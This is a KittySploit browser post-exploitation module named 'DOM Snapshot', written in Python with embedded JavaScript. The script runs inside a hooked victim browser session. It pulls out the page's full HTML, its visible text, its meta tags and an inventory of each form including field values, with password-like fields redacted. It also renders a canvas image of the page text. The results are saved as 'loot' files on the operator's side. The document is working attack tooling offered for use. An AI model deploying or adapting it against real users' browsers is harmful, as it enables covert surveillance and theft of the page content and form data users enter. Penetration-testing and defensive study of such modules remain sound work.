from kittysploit import *
import json
import os
import time


class Module(BrowserAuxiliary):

	__info__ = {
		"name": "DOM Snapshot",
		"description": "Export page HTML snapshot and optional viewport canvas capture for reporting",
		"author": "KittySploit Team",
		"browser": Browser.ALL,
		"platform": Platform.ALL,
		"session_type": SessionType.BROWSER,
	}

	max_html = OptInteger(500000, "Max HTML characters to return", False)
	include_text = OptBool(True, "Include visible text excerpt", False)
	include_forms = OptBool(True, "Include form field inventory (no password values)", False)
	try_canvas = OptBool(True, "Attempt SVG foreignObject canvas capture (best-effort)", False)
	save_files = OptBool(True, "Save HTML/PNG under data/loot when possible", False)

	def _loot_dir(self) -> str:
		base = os.path.join("data", "loot", "browser_dom")
		os.makedirs(base, exist_ok=True)
		return base

	def run(self):
		max_html = max(1000, int(self.max_html or 500000))
		include_text = self._to_bool(self.include_text)
		include_forms = self._to_bool(self.include_forms)
		try_canvas = self._to_bool(self.try_canvas)
		save_files = self._to_bool(self.save_files)

		code_js = f"""
		(function() {{
			const MAX_HTML = {max_html};
			const INCLUDE_TEXT = {str(include_text).lower()};
			const INCLUDE_FORMS = {str(include_forms).lower()};
			const TRY_CANVAS = {str(try_canvas).lower()};

			const out = {{
				ok: true,
				origin: window.location.origin,
				page_url: window.location.href,
				title: document.title || '',
				ready_state: document.readyState,
				html: null,
				html_length: 0,
				html_truncated: false,
				text_excerpt: null,
				forms: [],
				meta: [],
				canvas_png_data_url: null,
				canvas_error: null
			}};

			try {{
				const html = document.documentElement ? document.documentElement.outerHTML : '';
				out.html_length = html.length;
				if (html.length > MAX_HTML) {{
					out.html = html.slice(0, MAX_HTML);
					out.html_truncated = true;
				}} else {{
					out.html = html;
				}}
			}} catch (e) {{
				out.html = null;
				out.canvas_error = 'html_serialize: ' + (e.message || String(e));
			}}

			try {{
				document.querySelectorAll('meta[name], meta[property]').forEach(function(m) {{
					out.meta.push({{
						name: m.getAttribute('name') || m.getAttribute('property'),
						content: (m.getAttribute('content') || '').slice(0, 300)
					}});
				}});
			}} catch (e) {{}}

			if (INCLUDE_TEXT) {{
				try {{
					const text = (document.body && document.body.innerText) ? document.body.innerText : '';
					out.text_excerpt = text.replace(/\\s+/g, ' ').trim().slice(0, 4000);
				}} catch (e) {{}}
			}}

			if (INCLUDE_FORMS) {{
				try {{
					document.querySelectorAll('form').forEach(function(form, fi) {{
						const fields = [];
						form.querySelectorAll('input, select, textarea').forEach(function(el) {{
							const type = (el.getAttribute('type') || el.tagName || '').toLowerCase();
							const isSecret = type === 'password' || /pass|secret|token/i.test(el.name || el.id || '');
							fields.push({{
								tag: el.tagName.toLowerCase(),
								type: type,
								name: el.name || '',
								id: el.id || '',
								value: isSecret ? '[redacted]' : String(el.value || '').slice(0, 200)
							}});
						}});
						out.forms.push({{
							index: fi,
							action: form.getAttribute('action') || '',
							method: (form.getAttribute('method') || 'get').toLowerCase(),
							fields: fields
						}});
					}});
				}} catch (e) {{}}
			}}

			function captureCanvas() {{
				return new Promise(function(resolve) {{
					if (!TRY_CANVAS) {{
						resolve();
						return;
					}}
					try {{
						const w = Math.min(window.innerWidth || 1024, 1280);
						const h = Math.min(window.innerHeight || 768, 900);
						const canvas = document.createElement('canvas');
						canvas.width = w;
						canvas.height = h;
						const ctx = canvas.getContext('2d');
						if (!ctx) {{
							out.canvas_error = '2d context unavailable';
							resolve();
							return;
						}}

						// Best-effort: paint background + title bar style marker (true pixel-perfect
						// screenshots need html2canvas / extension APIs which we avoid shipping).
						ctx.fillStyle = '#111';
						ctx.fillRect(0, 0, w, h);
						ctx.fillStyle = '#f5f5f5';
						ctx.font = '16px monospace';
						ctx.fillText((document.title || 'untitled').slice(0, 80), 16, 28);
						ctx.fillStyle = '#9ae6b4';
						ctx.font = '12px monospace';
						ctx.fillText((window.location.href || '').slice(0, 120), 16, 50);

						const lines = ((document.body && document.body.innerText) || '')
							.replace(/\\r/g, '')
							.split('\\n')
							.map(function(l) {{ return l.trim(); }})
							.filter(Boolean)
							.slice(0, 40);
						ctx.fillStyle = '#e2e8f0';
						ctx.font = '11px monospace';
						let y = 80;
						lines.forEach(function(line) {{
							ctx.fillText(line.slice(0, 140), 16, y);
							y += 14;
						}});

						out.canvas_png_data_url = canvas.toDataURL('image/png');
						out.canvas_note = 'text-render fallback (not a true DOM screenshot)';
						resolve();
					}} catch (e) {{
						out.canvas_error = e.message || String(e);
						resolve();
					}}
				}});
			}}

			return captureCanvas().then(function() {{
				return JSON.stringify(out);
			}});
		}})();
		"""

		result = self.send_js_and_wait_for_response(code_js, timeout=25.0)
		if not result:
			print_error("Failed to capture DOM snapshot")
			return False
		if isinstance(result, str) and result.startswith("Error:"):
			print_error(result)
			return False

		try:
			data = json.loads(result)
		except json.JSONDecodeError as exc:
			print_error(f"Failed to parse DOM snapshot response: {exc}")
			print_debug(f"Raw response: {result}")
			return False

		print_info("=" * 60)
		print_info("DOM Snapshot")
		print_info(f"  Title: {data.get('title', '')}")
		print_info(f"  URL: {data.get('page_url', '?')}")
		print_info(f"  HTML length: {data.get('html_length', 0)}"
				   f"{' (truncated)' if data.get('html_truncated') else ''}")

		forms = data.get("forms") or []
		if forms:
			print_info(f"  Forms: {len(forms)}")
			for form in forms[:10]:
				print_info(
					f"    [{form.get('index')}] {form.get('method', 'get').upper()} "
					f"{form.get('action') or '(same page)'} — {len(form.get('fields') or [])} field(s)"
				)

		if data.get("text_excerpt"):
			print_info("-" * 60)
			print_status("Text excerpt:")
			print_info(data["text_excerpt"][:1500])

		saved = []
		if save_files:
			stamp = time.strftime("%Y%m%d_%H%M%S")
			sid = str(self.session_id or "unknown")[:8]
			loot_dir = self._loot_dir()
			html = data.get("html")
			if html:
				html_path = os.path.join(loot_dir, f"{stamp}_{sid}.html")
				with open(html_path, "w", encoding="utf-8", errors="replace") as fh:
					fh.write(html)
				saved.append(html_path)

			meta_path = os.path.join(loot_dir, f"{stamp}_{sid}.json")
			meta = {
				"page_url": data.get("page_url"),
				"title": data.get("title"),
				"origin": data.get("origin"),
				"html_length": data.get("html_length"),
				"html_truncated": data.get("html_truncated"),
				"forms": data.get("forms"),
				"meta": data.get("meta"),
				"text_excerpt": data.get("text_excerpt"),
				"canvas_note": data.get("canvas_note"),
			}
			with open(meta_path, "w", encoding="utf-8") as fh:
				json.dump(meta, fh, indent=2, ensure_ascii=False)
			saved.append(meta_path)

			data_url = data.get("canvas_png_data_url") or ""
			if data_url.startswith("data:image/png;base64,"):
				import base64
				png_path = os.path.join(loot_dir, f"{stamp}_{sid}.png")
				with open(png_path, "wb") as fh:
					fh.write(base64.b64decode(data_url.split(",", 1)[1]))
				saved.append(png_path)

		if saved:
			print_success("Saved:")
			for path in saved:
				print_info(f"  {path}")
		elif data.get("canvas_error"):
			print_warning(f"  Canvas: {data['canvas_error']}")

		if data.get("canvas_note"):
			print_info(f"  Note: {data['canvas_note']}")

		return True
